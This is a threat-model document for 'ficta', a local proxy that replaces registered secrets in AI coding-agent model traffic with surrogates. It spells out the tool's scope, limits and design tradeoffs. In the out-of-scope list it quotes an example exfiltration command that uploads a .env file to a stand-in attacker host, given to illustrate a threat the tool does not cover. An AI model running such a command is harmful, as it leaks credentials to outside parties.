# Threat model

ficta is a local privacy guardrail for AI coding-agent **model traffic**. It is not a sandbox,
enterprise DLP product, compliance control, or malware/exfiltration prevention system.

## The promise

For values that ficta has loaded into its registry, such as exact values from `.env` files or Doppler, ficta attempts to:

1. replace those exact values with local surrogates before sending covered request bodies, query strings, and non-auth headers to the model provider;
2. block the request if an expected exact value would still be forwarded verbatim; and
3. restore surrogates back to real values locally in text/JSON/SSE responses so the coding agent keeps working.

This is an **exact-match** promise for registered values in covered request surfaces, not a general
claim that all secrets or all PII are detected. Any public "security" wording should include this
scope.

## Covered by default

- Model API request bodies handled by the proxy.
- Query strings handled by the proxy.
- Non-auth request headers handled by the proxy.
- JSON/text/event-stream responses, for local surrogate restoration.
- Exact registered values loaded from configured registry sources.
- Secret-ish process environment values inherited by the wrapper, unless process-env loading is disabled.

## Intentionally not covered

- Provider-required auth headers such as `Authorization`, `x-api-key`, cookies, and proxy auth. The upstream needs these to authenticate.
- Values transformed before the model sees them, such as base64, URL encoding, chunks, hashes, compression, or concatenation, unless the transformed form is also registered.
- Filesystem-path-like tokens by default. This keeps agents from breaking local `cd`, `Read`, `Edit`, and similar tool calls. Do not put real secrets in path names, or set `FICTA_REDACT_PATHS=1`.
- Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system.
- Binary responses.
- Secrets the agent reads or sends outside the proxied model API channel.

## Design tradeoffs

- **Exact-match over broad guessing.** The reliable layer is values you already know. Detector-style matching can be added, but is best effort.
- **Fail closed for expected leaks.** If a registered value remains in a covered surface after redaction, ficta blocks rather than forwarding.
- **Usability for coding agents.** Local paths are preserved by default because broken paths cause agents to execute bad tool calls.
- **Local only.** Registry values and surrogate mappings are kept in memory for the local proxy session and are not intentionally sent anywhere except where explicitly restored locally. The proxy-internal surrogate key is not passed to child agent processes.

## Positioning guardrails

When publishing or explaining ficta:

- Lead with registered secret values from `.env`, process env, and Doppler.
- Do not present ficta as full DLP, compliance tooling, or a substitute for enterprise controls.
- Do not lead with PII; detector plugins are best-effort additions, not the core promise.
- Do not claim "never leaks" or "secure" without the covered-surface exact-match scope above.
- Do not market tool-execution exfiltration protection unless OS/container/agent controls are part
  of the setup.

See [`publishing.md`](./publishing.md) for release-positioning guidance.

## What to use alongside ficta

For stronger isolation, combine ficta with:

- a restricted workspace/filesystem sandbox;
- an outbound network allowlist or container-level egress policy;
- strict coding-agent tool permissions; and
- normal secret hygiene: don't put real secrets in filenames, prompts, docs, screenshots, or public logs.
